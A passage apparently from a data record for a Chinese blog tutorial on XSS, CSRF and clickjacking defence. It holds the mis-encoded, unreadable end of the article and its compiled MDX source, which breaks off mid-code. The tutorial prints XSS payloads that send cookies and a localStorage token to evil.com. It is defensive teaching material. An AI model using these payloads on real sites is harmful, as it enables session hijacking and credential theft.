ğŸ›¡ï¸\n\nXSSã€CSRFå’Œç‚¹å‡»åŠ«æŒè™½ç„¶å„æœ‰ç‰¹ç‚¹ï¼Œä½†å®ƒä»¬çš„é˜²å¾¡æœ‰ç€å…±åŒçš„å“²å­¦ï¼š**æœ€å°ä¿¡ä»»**ã€**åˆ†å±‚é˜²æŠ¤**å’Œ**ç”¨æˆ·ä¼˜å…ˆ**ã€‚ä»¥ä¸‹æ˜¯æ¶æ„å±‚é¢çš„å»ºè®®ï¼š\n\n1. **è¾“å…¥ä¸è¾“å‡ºåˆ†ç¦»**ï¼šå°†ç”¨æˆ·è¾“å…¥è§†ä¸ºâ€œä¸å¯ä¿¡â€ï¼Œåœ¨è¾“å…¥ç«¯éªŒè¯æ ¼å¼ï¼Œåœ¨è¾“å‡ºç«¯è½¬ä¹‰å†…å®¹ã€‚\n2. **åˆ†å±‚é˜²å¾¡**ï¼šä»æµè§ˆå™¨ï¼ˆCSPã€X-Frame-Optionsï¼‰ã€å‰ç«¯ï¼ˆè½¬ä¹‰ã€Tokenï¼‰ã€åç«¯ï¼ˆéªŒè¯ã€æƒé™ï¼‰å¤šå±‚é˜²æŠ¤ã€‚\n3. **è‡ªåŠ¨åŒ–æ£€æµ‹**ï¼šé›†æˆå®‰å…¨æ‰«æå·¥å…·ï¼ˆå¦‚OWASP ZAPï¼‰åˆ°CI/CDæµç¨‹ï¼ŒåŠæ—¶å‘ç°æ¼æ´ã€‚\n4. **ç”¨æˆ·æ•™è‚²**ï¼šé€šè¿‡UIæç¤ºï¼ˆå¦‚â€œæ­£åœ¨æäº¤æ•æ„Ÿæ“ä½œâ€ï¼‰ï¼Œå¢å¼ºç”¨æˆ·çš„å®‰å…¨æ„è¯†ã€‚\n\n*å°Tipsï¼šå®‰å…¨ä¸æ˜¯ä¸€æ¬¡æ€§ä»»åŠ¡ï¼Œè€Œæ˜¯è´¯ç©¿å¼€å‘å…¨æµç¨‹çš„ä¹ æƒ¯ã€‚*\n\n### ç»¼åˆç¤ºä¾‹ï¼šå®‰å…¨çš„è¡¨å•æäº¤\n```html\n<form action=\"/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"_csrf\" value=\"<%= csrfToken %>\">\n  <input type=\"text\" name=\"amount\" required pattern=\"[0-9]+\">\n  <button type=\"submit\" onclick=\"confirm('ç¡®è®¤è½¬è´¦ï¼Ÿ')\">æäº¤</button>\n</form>\n```\n\nåç«¯ï¼š\n```javascript\napp.use(helmet()); // è®¾ç½®X-Frame-Optionsç­‰å®‰å…¨å¤´\napp.post('/transfer', (req, res) => {\n  if (req.body._csrf !== req.cookies.csrfToken) {\n    return res.status(403).send('Invalid CSRF Token');\n  }\n  // éªŒè¯è¾“å…¥\n  if (!/^[0-9]+$/.test(req.body.amount)) {\n    return res.status(400).send('Invalid amount');\n  }\n  // å¤„ç†è½¬è´¦\n});\n```\n\n*å°Tipsï¼šä½¿ç”¨`helmet`ç­‰ä¸­é—´ä»¶èƒ½å¿«é€Ÿå¢å¼ºåç«¯å®‰å…¨ï¼Œä½†ä»éœ€æ‰‹åŠ¨æ£€æŸ¥é…ç½®ã€‚*\n\n## äº”ã€ç»“è¯­ï¼šå®‰å…¨çš„è‰ºæœ¯ä¸ä½¿å‘½\n\n> â€œå®‰å…¨å¦‚é£ï¼Œè§¦ä¹‹æ— å½¢ï¼Œå¤±ä¹‹è‡´å‘½ã€‚â€ â€”â€” åŸåˆ›\n\nXSSã€CSRFå’Œç‚¹å‡»åŠ«æŒä¸ä»…æ˜¯æŠ€æœ¯æŒ‘æˆ˜ï¼Œæ›´æ˜¯å¼€å‘è€…å¯¹ç”¨æˆ·ã€å¯¹ç³»ç»Ÿçš„æ‰¿è¯ºã€‚å®ƒä»¬æé†’æˆ‘ä»¬ï¼Œä»£ç ä¸ä»…æ˜¯åŠŸèƒ½çš„å®ç°ï¼Œæ›´æ˜¯ä¿¡ä»»çš„ä¼ é€’ã€‚åœ¨è¿™åœºä¸æ”»å‡»è€…çš„åšå¼ˆä¸­ï¼Œæˆ‘ä»¬éœ€è¦ä»¥è¯—äººçš„æµªæ¼«ä¹¦å†™ä»£ç ï¼Œä»¥å°†å†›çš„ä¸¥è°¨å®ˆæŠ¤å®‰å…¨ï¼Œä»¥å“²å­¦å®¶çš„æ·±é‚ƒæ€è€ƒæ¶æ„ã€‚\n\næ„¿ä½ åœ¨è¿™æ¡å®‰å…¨çš„æ—…é€”ä¸­ï¼Œä¸ä»…æ”¶è·æŠ€æœ¯ï¼Œæ›´æ”¶è·å¯¹Webå¼€å‘çš„æ•¬ç•ä¸çƒ­çˆ±ã€‚è®©æˆ‘ä»¬ä»¥ä»£ç ä¸ºç¬”ï¼Œä»¥å®‰å…¨ä¸ºå¢¨ï¼Œä¹¦å†™å±äºå‰ç«¯å¼€å‘è€…çš„å²è¯—ï¼âœ¨\n\n---",
    "code": "var Component=(()=>{var p=Object.create;var d=Object.defineProperty;var E=Object.getOwnPropertyDescriptor;var y=Object.getOwnPropertyNames;var g=Object.getPrototypeOf,F=Object.prototype.hasOwnProperty;var u=(n,e)=>()=>(e||n((e={exports:{}}).exports,e),e.exports),m=(n,e)=>{for(var r in e)d(n,r,{get:e[r],enumerable:!0})},t=(n,e,r,a)=>{if(e&&typeof e==\"object\"||typeof e==\"function\")for(let c of y(e))!F.call(n,c)&&c!==r&&d(n,c,{get:()=>e[c],enumerable:!(a=E(e,c))||a.enumerable});return n};var f=(n,e,r)=>(r=n!=null?p(g(n)):{},t(e||!n||!n.__esModule?d(r,\"default\",{value:n,enumerable:!0}):r,n)),B=n=>t(d({},\"__esModule\",{value:!0}),n);var h=u((S,i)=>{i.exports=_jsx_runtime});var b={};m(b,{default:()=>o,frontmatter:()=>C});var l=f(h()),C={type:\"Post\",title:\"\\u6D1E\\u6089Web\\u5B89\\u5168\\uFF1A\\u6DF1\\u5165\\u5256\\u6790XSS\\u3001CSRF\\u4E0E\\u70B9\\u51FB\\u52AB\\u6301\\u7684\\u827A\\u672F\\u4E0E\\u54F2\\u5B66\",date:\"2022-11-22\",description:\"\\u5168\\u9762\\u89E3\\u6790XSS\\u3001CSRF\\u548C\\u70B9\\u51FB\\u52AB\\u6301\\u7684\\u539F\\u7406\\u3001\\u653B\\u51FB\\u624B\\u6CD5\\u4E0E\\u9632\\u5FA1\\u7B56\\u7565\\uFF0C\\u7ED3\\u5408\\u5B9E\\u4F8B\\u3001\\u6700\\u4F73\\u5B9E\\u8DF5\\u548C\\u67B6\\u6784\\u601D\\u8003\\uFF0C\\u4E3A\\u524D\\u7AEF\\u5F00\\u53D1\\u8005\\u63D0\\u4F9B\\u6DF1\\u5EA6\\u6307\\u5357\\u3002\",keywords:\"Web\\u5B89\\u5168, XSS, CSRF, \\u70B9\\u51FB\\u52AB\\u6301, \\u524D\\u7AEF\\u5F00\\u53D1, \\u5B89\\u5168\\u67B6\\u6784, \\u9632\\u5FA1\\u7B56\\u7565, \\u7F16\\u7801\\u89C4\\u8303\",author:\"\\u6653\\u9F99\",image:\"/images/hero/web_security.jpg\",tags:[\"Web\\u5B89\\u5168\",\"\\u524D\\u7AEF\\u5F00\\u53D1\",\"\\u5B89\\u5168\\u67B6\\u6784\"],category:\"\\u524D\\u7AEF\\u6280\\u672F\"};function s(n){let e={a:\"a\",blockquote:\"blockquote\",code:\"code\",em:\"em\",figure:\"figure\",h2:\"h2\",h3:\"h3\",h4:\"h4\",hr:\"hr\",li:\"li\",ol:\"ol\",p:\"p\",pre:\"pre\",span:\"span\",strong:\"strong\",table:\"table\",tbody:\"tbody\",td:\"td\",th:\"th\",thead:\"thead\",tr:\"tr\",...n.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsxs)(e.blockquote,{children:[`\n`,(0,l.jsx)(e.p,{children:\"\\u201C\\u51E1\\u4E8B\\u9884\\u5219\\u7ACB\\uFF0C\\u4E0D\\u9884\\u5219\\u5E9F\\u3002\\u201D \\u2014\\u2014\\u300A\\u793C\\u8BB0\\xB7\\u4E2D\\u5EB8\\u300B\"}),`\n`]}),`\n`,(0,l.jsx)(e.p,{children:\"\\u5728Web\\u5F00\\u53D1\\u7684\\u6D69\\u701A\\u661F\\u6D77\\u4E2D\\uFF0C\\u5B89\\u5168\\u5982\\u540C\\u4E00\\u5EA7\\u706F\\u5854\\uFF0C\\u6307\\u5F15\\u6211\\u4EEC\\u907F\\u5F00\\u6697\\u7901\\u4E0E\\u98CE\\u6D6A\\u3002XSS\\u3001CSRF\\u548C\\u70B9\\u51FB\\u52AB\\u6301\\uFF0C\\u8FD9\\u4E9B\\u6F5C\\u85CF\\u5728\\u4EE3\\u7801\\u6DF1\\u5904\\u7684\\u5E7D\\u7075\\uFF0C\\u65E2\\u662F\\u6311\\u6218\\uFF0C\\u4E5F\\u662F\\u901A\\u5411\\u5353\\u8D8A\\u7684\\u8BD5\\u70BC\\u573A\\u3002\\u672C\\u6587\\u5C06\\u4EE5\\u6DF1\\u5165\\u6D45\\u51FA\\u7684\\u65B9\\u5F0F\\uFF0C\\u5E26\\u4F60\\u8D70\\u8FDB\\u8FD9\\u4E9B\\u5B89\\u5168\\u5A01\\u80C1\\u7684\\u672C\\u8D28\\uFF0C\\u63A2\\u7D22\\u9632\\u5FA1\\u7684\\u827A\\u672F\\u4E0E\\u54F2\\u5B66\\uFF0C\\u52A9\\u4F60\\u6210\\u4E3A\\u66F4\\u5168\\u9762\\u7684\\u524D\\u7AEF\\u5F00\\u53D1\\u8005\\u3002\\u{1F60E}\"}),`\n`,(0,l.jsx)(e.h2,{id:\"\\u5F15\\u8A00\\u5B89\\u5168\\u7684\\u8BD7\\u610F\\u4E0E\\u54F2\\u5B66\",children:(0,l.jsx)(e.a,{href:\"#\\u5F15\\u8A00\\u5B89\\u5168\\u7684\\u8BD7\\u610F\\u4E0E\\u54F2\\u5B66\",children:\"\\u5F15\\u8A00\\uFF1A\\u5B89\\u5168\\u7684\\u8BD7\\u610F\\u4E0E\\u54F2\\u5B66\"})}),`\n`,(0,l.jsx)(e.p,{children:\"Web\\u5F00\\u53D1\\u5982\\u540C\\u4E00\\u573A\\u76DB\\u5927\\u7684\\u4EA4\\u54CD\\u4E50\\uFF0C\\u524D\\u7AEF\\u5F00\\u53D1\\u8005\\u662F\\u8C31\\u5199\\u65CB\\u5F8B\\u7684\\u4E50\\u624B\\uFF0C\\u800C\\u5B89\\u5168\\u5219\\u662F\\u90A3\\u4E0D\\u53EF\\u6216\\u7F3A\\u7684\\u8282\\u62CD\\u5668\\u3002XSS\\uFF08\\u8DE8\\u7AD9\\u811A\\u672C\\u653B\\u51FB\\uFF09\\u3001CSRF\\uFF08\\u8DE8\\u7AD9\\u8BF7\\u6C42\\u4F2A\\u9020\\uFF09\\u548C\\u70B9\\u51FB\\u52AB\\u6301\\uFF08Clickjacking\\uFF09\\uFF0C\\u8FD9\\u4E09\\u5927\\u5A01\\u80C1\\u5982\\u540C\\u4E50\\u7AE0\\u4E2D\\u7684\\u4E0D\\u548C\\u8C10\\u97F3\\u7B26\\uFF0C\\u82E5\\u4E0D\\u59A5\\u5584\\u5904\\u7406\\uFF0C\\u4FBF\\u53EF\\u80FD\\u6BC1\\u6389\\u6574\\u573A\\u6F14\\u51FA\\u3002\\u5B83\\u4EEC\\u4E0D\\u4EC5\\u662F\\u6280\\u672F\\u95EE\\u9898\\uFF0C\\u66F4\\u5173\\u4E4E\\u67B6\\u6784\\u8BBE\\u8BA1\\u3001\\u7528\\u6237\\u4FE1\\u4EFB\\u548C\\u5F00\\u53D1\\u8005\\u7684\\u8D23\\u4EFB\\u611F\\u3002\"}),`\n`,(0,l.jsxs)(e.blockquote,{children:[`\n`,(0,l.jsx)(e.p,{children:\"\\u201C\\u4EE3\\u7801\\u662F\\u8BD7\\uFF0C\\u5B89\\u5168\\u662F\\u97F5\\u3002\\u201D \\u2014\\u2014 \\u533F\\u540D\\u5F00\\u53D1\\u8005\"}),`\n`]}),`\n`,(0,l.jsx)(e.p,{children:\"\\u672C\\u6587\\u5C06\\u4EE5\\u6E05\\u6670\\u7684\\u903B\\u8F91\\u94FE\\uFF0C\\u5E26\\u4F60\\u4ECE\\u539F\\u7406\\u5230\\u5B9E\\u8DF5\\u3001\\u4ECE\\u6280\\u672F\\u5230\\u54F2\\u5B66\\uFF0C\\u5168\\u9762\\u5256\\u6790\\u8FD9\\u4E09\\u5927\\u5A01\\u80C1\\u3002\\u6211\\u4EEC\\u5C06\\u7ED3\\u5408\\u5B9E\\u4F8B\\u3001\\u8868\\u683C\\u3001\\u6700\\u4F73\\u5B9E\\u8DF5\\uFF0C\\u751A\\u81F3\\u4E00\\u4E9B\\u7C7B\\u6BD4\\u548C\\u5E7D\\u9ED8\\uFF0C\\u8BA9\\u4F60\\u8BFB\\u6765\\u65E2\\u5B9E\\u7528\\u53C8\\u6109\\u60A6\\u3002\\u51C6\\u5907\\u597D\\u4F60\\u7684\\u952E\\u76D8\\uFF0C\\u7CFB\\u597D\\u5B89\\u5168\\u5E26\\uFF0C\\u8BA9\\u6211\\u4EEC\\u5F00\\u59CB\\u8FD9\\u573A\\u5B89\\u5168\\u4E4B\\u65C5\\u5427\\uFF01\\u{1F680}\"}),`\n`,(0,l.jsx)(e.h2,{id:\"\\u4E00xss\\u5F53\\u4EE3\\u7801\\u53D8\\u6210\\u6076\\u4F5C\\u5267\\u5C0F\\u4E11-\",children:(0,l.jsx)(e.a,{href:\"#\\u4E00xss\\u5F53\\u4EE3\\u7801\\u53D8\\u6210\\u6076\\u4F5C\\u5267\\u5C0F\\u4E11-\",children:\"\\u4E00\\u3001XSS\\uFF1A\\u5F53\\u4EE3\\u7801\\u53D8\\u6210\\u201C\\u6076\\u4F5C\\u5267\\u5C0F\\u4E11\\u201D \\u{1F921}\"})}),`\n`,(0,l.jsx)(e.h3,{id:\"11-xss\\u662F\\u4EC0\\u4E48\",children:(0,l.jsx)(e.a,{href:\"#11-xss\\u662F\\u4EC0\\u4E48\",children:\"1.1 XSS\\u662F\\u4EC0\\u4E48\\uFF1F\"})}),`\n`,(0,l.jsxs)(e.p,{children:[\"\\u8DE8\\u7AD9\\u811A\\u672C\\u653B\\u51FB\\uFF08Cross-Site Scripting\\uFF0C\\u7B80\\u79F0XSS\\uFF09\\u662F\\u4E00\\u79CD\\u901A\\u8FC7\\u5728\\u7F51\\u9875\\u4E2D\\u6CE8\\u5165\\u6076\\u610F\\u811A\\u672C\\uFF0C\\u7A83\\u53D6\\u7528\\u6237\\u6570\\u636E\\u3001\\u7BE1\\u6539\\u9875\\u9762\\u6216\\u6267\\u884C\\u6076\\u610F\\u64CD\\u4F5C\\u7684\\u653B\\u51FB\\u65B9\\u5F0F\\u3002\\u5B83\\u7684\\u672C\\u8D28\\u662F\",(0,l.jsx)(e.strong,{children:\"\\u8F93\\u5165\\u672A\\u88AB\\u6B63\\u786E\\u5904\\u7406\"}),\"\\uFF0C\\u5BFC\\u81F4\\u6076\\u610F\\u4EE3\\u7801\\u88AB\\u5F53\\u4F5C\\u6B63\\u5E38\\u811A\\u672C\\u6267\\u884C\\u3002\"]}),`\n`,(0,l.jsx)(e.p,{children:\"\\u7C7B\\u6BD4\\u4E00\\u4E0B\\uFF0CXSS\\u5C31\\u50CF\\u4E00\\u4E2A\\u201C\\u6076\\u4F5C\\u5267\\u5C0F\\u4E11\\u201D\\uFF1A\\u4F60\\u672C\\u4EE5\\u4E3A\\u5B83\\u53EA\\u662F\\u4E2A\\u65E0\\u5BB3\\u7684\\u8BC4\\u8BBA\\u6846\\uFF0C\\u5374\\u4E0D\\u77E5\\u5B83\\u5077\\u5077\\u585E\\u8FDB\\u4E86\\u201C\\u54C8\\u54C8\\uFF0C\\u6211\\u8981\\u5077\\u4F60Cookie\\u201D\\u7684\\u5267\\u672C\\u3002\\u{1F3AD}\"}),`\n`,(0,l.jsx)(e.p,{children:\"XSS\\u53EF\\u5206\\u4E3A\\u4E09\\u7C7B\\uFF1A\"}),`\n`,(0,l.jsxs)(e.table,{children:[(0,l.jsx)(e.thead,{children:(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.th,{children:\"\\u7C7B\\u578B\"}),(0,l.jsx)(e.th,{children:\"\\u63CF\\u8FF0\"}),(0,l.jsx)(e.th,{children:\"\\u5371\\u5BB3\\u7A0B\\u5EA6\"}),(0,l.jsx)(e.th,{children:\"\\u5178\\u578B\\u573A\\u666F\"})]})}),(0,l.jsxs)(e.tbody,{children:[(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.td,{children:\"\\u53CD\\u5C04\\u578BXSS\"}),(0,l.jsx)(e.td,{children:\"\\u6076\\u610F\\u811A\\u672C\\u901A\\u8FC7URL\\u53C2\\u6570\\u4F20\\u9012\\uFF0C\\u9700\\u8BF1\\u5BFC\\u7528\\u6237\\u70B9\\u51FB\\u89E6\\u53D1\"}),(0,l.jsx)(e.td,{children:\"\\u4E2D\"}),(0,l.jsx)(e.td,{children:\"\\u9493\\u9C7C\\u94FE\\u63A5\\u3001\\u4F2A\\u9020\\u641C\\u7D22\\u7ED3\\u679C\"})]}),(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.td,{children:\"\\u5B58\\u50A8\\u578BXSS\"}),(0,l.jsx)(e.td,{children:\"\\u6076\\u610F\\u811A\\u672C\\u5B58\\u50A8\\u5728\\u670D\\u52A1\\u5668\\uFF08\\u5982\\u6570\\u636E\\u5E93\\uFF09\\uFF0C\\u6BCF\\u6B21\\u8BBF\\u95EE\\u9875\\u9762\\u90FD\\u4F1A\\u6267\\u884C\"}),(0,l.jsx)(e.td,{children:\"\\u9AD8\"}),(0,l.jsx)(e.td,{children:\"\\u8BBA\\u575B\\u8BC4\\u8BBA\\u3001\\u7528\\u6237\\u7B80\\u4ECB\"})]}),(0,l.jsxs)(e.tr,{children:[(0,l.jsx)(e.td,{children:\"DOM\\u578BXSS\"}),(0,l.jsx)(e.td,{children:\"\\u6076\\u610F\\u811A\\u672C\\u901A\\u8FC7\\u5BA2\\u6237\\u7AEFJavaScript\\u76F4\\u63A5\\u64CD\\u4F5CDOM\\u89E6\\u53D1\\uFF0C\\u65E0\\u9700\\u670D\\u52A1\\u5668\\u4EA4\\u4E92\"}),(0,l.jsx)(e.td,{children:\"\\u4E2D\"}),(0,l.jsx)(e.td,{children:\"\\u5355\\u9875\\u5E94\\u7528\\u3001\\u52A8\\u6001\\u5185\\u5BB9\\u6E32\\u67D3\"})]})]})]}),`\n`,(0,l.jsx)(e.p,{children:(0,l.jsx)(e.em,{children:\"\\u5C0FTips\\uFF1A\\u53CD\\u5C04\\u578BXSS\\u4F9D\\u8D56\\u7528\\u6237\\u70B9\\u51FB\\uFF0C\\u5B58\\u50A8\\u578BXSS\\u66F4\\u50CF\\u201C\\u5B9A\\u65F6\\u70B8\\u5F39\\u201D\\uFF0C\\u800CDOM\\u578BXSS\\u5219\\u662F\\u201C\\u524D\\u7AEF\\u81EA\\u5DF1\\u7684\\u9505\\u201D\\u3002\\u68C0\\u67E5\\u8F93\\u5165\\u3001\\u8F93\\u51FA\\u548CDOM\\u64CD\\u4F5C\\u662F\\u5173\\u952E\\uFF01\"})}),`\n`,(0,l.jsx)(e.h3,{id:\"12-xss\\u7684\\u539F\\u7406\\u4FE1\\u4EFB\\u7684\\u80CC\\u53DB\",children:(0,l.jsx)(e.a,{href:\"#12-xss\\u7684\\u539F\\u7406\\u4FE1\\u4EFB\\u7684\\u80CC\\u53DB\",children:\"1.2 XSS\\u7684\\u539F\\u7406\\uFF1A\\u4FE1\\u4EFB\\u7684\\u80CC\\u53DB\"})}),`\n`,(0,l.jsxs)(e.p,{children:[\"XSS\\u7684\\u6838\\u5FC3\\u5728\\u4E8E\",(0,l.jsx)(e.strong,{children:\"\\u6D4F\\u89C8\\u5668\\u5BF9\\u811A\\u672C\\u7684\\u4FE1\\u4EFB\"}),\"\\u3002\\u5F53\\u7528\\u6237\\u8F93\\u5165\\u7684\\u6570\\u636E\\u672A\\u7ECF\\u8F6C\\u4E49\\u76F4\\u63A5\\u63D2\\u5165\\u5230HTML\\u3001JavaScript\\u6216CSS\\u4E2D\\uFF0C\\u6D4F\\u89C8\\u5668\\u4F1A\\u5C06\\u5176\\u89C6\\u4E3A\\u5408\\u6CD5\\u4EE3\\u7801\\u6267\\u884C\\u3002\\u4F8B\\u5982\\uFF1A\"]}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"html\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.code,{\"data-language\":\"html\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"<\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"div\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">{userInput}</\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"div\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]})})})}),`\n`,(0,l.jsxs)(e.p,{children:[\"\\u5982\\u679C \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"userInput\"})})})}),\" \\u662F \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"<script>alert('Hacked!')<\\/script>\"})})})}),\"\\uFF0C\\u6D4F\\u89C8\\u5668\\u4F1A\\u4E56\\u4E56\\u6267\\u884C\\uFF0C\\u5F39\\u51FA\\u201CHacked!\\u201D\\u3002\\u66F4\\u53EF\\u6015\\u7684\\u662F\\uFF0C\\u653B\\u51FB\\u8005\\u53EF\\u80FD\\u7A83\\u53D6 \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"document.cookie\"})})})}),\" \\u6216\\u53D1\\u8D77\\u6076\\u610F\\u8BF7\\u6C42\\u3002\"]}),`\n`,(0,l.jsxs)(e.blockquote,{children:[`\n`,(0,l.jsx)(e.p,{children:\"\\u201C\\u4FE1\\u4EFB\\u662F\\u628A\\u53CC\\u5203\\u5251\\uFF0C\\u8FC7\\u5EA6\\u4FE1\\u4EFB\\u5219\\u81EA\\u6398\\u575F\\u5893\\u3002\\u201D \\u2014\\u2014 \\u67D0\\u5B89\\u5168\\u4E13\\u5BB6\"}),`\n`]}),`\n`,(0,l.jsx)(e.h3,{id:\"13-xss\\u653B\\u51FB\\u5B9E\\u4F8B\\u4ECE\\u5F39\\u7A97\\u5230\\u7A83\\u5BC6\",children:(0,l.jsx)(e.a,{href:\"#13-xss\\u653B\\u51FB\\u5B9E\\u4F8B\\u4ECE\\u5F39\\u7A97\\u5230\\u7A83\\u5BC6\",children:\"1.3 XSS\\u653B\\u51FB\\u5B9E\\u4F8B\\uFF1A\\u4ECE\\u5F39\\u7A97\\u5230\\u7A83\\u5BC6\"})}),`\n`,(0,l.jsx)(e.h4,{id:\"\\u5B9E\\u4F8B1\\u53CD\\u5C04\\u578Bxss\",children:(0,l.jsx)(e.a,{href:\"#\\u5B9E\\u4F8B1\\u53CD\\u5C04\\u578Bxss\",children:\"\\u5B9E\\u4F8B1\\uFF1A\\u53CD\\u5C04\\u578BXSS\"})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u653B\\u51FB\\u8005\\u6784\\u9020\\u4E00\\u4E2A\\u6076\\u610F\\u94FE\\u63A5\\uFF1A\"}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"http://example.com/search?q=<script>document.location='http://evil.com?cookie='+document.cookie<\\/script>\"})})})})}),`\n`,(0,l.jsxs)(e.p,{children:[\"\\u7528\\u6237\\u70B9\\u51FB\\u540E\\uFF0C\\u811A\\u672C\\u6267\\u884C\\uFF0CCookie\\u88AB\\u53D1\\u9001\\u5230 \",(0,l.jsx)(e.span,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0,l.jsx)(e.span,{children:\"evil.com\"})})})}),\"\\u3002\"]}),`\n`,(0,l.jsx)(e.h4,{id:\"\\u5B9E\\u4F8B2\\u5B58\\u50A8\\u578Bxss\",children:(0,l.jsx)(e.a,{href:\"#\\u5B9E\\u4F8B2\\u5B58\\u50A8\\u578Bxss\",children:\"\\u5B9E\\u4F8B2\\uFF1A\\u5B58\\u50A8\\u578BXSS\"})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u653B\\u51FB\\u8005\\u5728\\u8BBA\\u575B\\u8BC4\\u8BBA\\u4E2D\\u8F93\\u5165\\uFF1A\"}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"html\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.code,{\"data-language\":\"html\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"<\"}),(0,l.jsx)(e.span,{style:{color:\"#85E89D\"},children:\"img\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" src\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"x\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\" onerror\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"'}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"fetch\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"('http\"}),(0,l.jsx)(e.span,{style:{color:\"#FDAEB7\",fontStyle:\"italic\"},children:\":\"}),(0,l.jsx)(e.span,{style:{color:\"#6A737D\"},children:\"//evil.com/steal?data='+localStorage.getItem('token'))\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:'\"'}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\">\"})]})})})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u6BCF\\u6B21\\u7528\\u6237\\u8BBF\\u95EE\\u8BE5\\u9875\\u9762\\uFF0C\\u811A\\u672C\\u90FD\\u4F1A\\u7A83\\u53D6\\u672C\\u5730\\u5B58\\u50A8\\u7684Token\\u3002\"}),`\n`,(0,l.jsx)(e.h4,{id:\"\\u5B9E\\u4F8B3dom\\u578Bxss\",children:(0,l.jsx)(e.a,{href:\"#\\u5B9E\\u4F8B3dom\\u578Bxss\",children:\"\\u5B9E\\u4F8B3\\uFF1ADOM\\u578BXSS\"})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u524D\\u7AEF\\u4EE3\\u7801\\uFF1A\"}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"javascript\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.code,{\"data-language\":\"javascript\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:(0,l.jsxs)(e.span,{\"data-line\":\"\",children:[(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"document.\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"getElementById\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"(\"}),(0,l.jsx)(e.span,{style:{color:\"#9ECBFF\"},children:\"'output'\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\").innerHTML \"}),(0,l.jsx)(e.span,{style:{color:\"#F97583\"},children:\"=\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\" window.location.hash.\"}),(0,l.jsx)(e.span,{style:{color:\"#B392F0\"},children:\"slice\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\"(\"}),(0,l.jsx)(e.span,{style:{color:\"#79B8FF\"},children:\"1\"}),(0,l.jsx)(e.span,{style:{color:\"#E1E4E8\"},children:\");\"})]})})})}),`\n`,(0,l.jsx)(e.p,{children:\"\\u653B\\u51FB\\u8005\\u6784\\u9020URL\\uFF1A\"}),`\n`,(0,l.jsx)(e.figure,{\"data-rehype-pretty-code-figure\":\"\",children:(0,l.jsx)(e.pre,{tabIndex:\"0\",\"data-language\":\"text\",\"data-theme\":\"github-dark\",children:(0,l.jsx)(e.code,{\"data-language\":\"text\",\"data-theme\":\"github-dark\",style:{display:\"grid\"},children:(0,l.jsx)(e.span,{\"data-line\":\"\",children:(0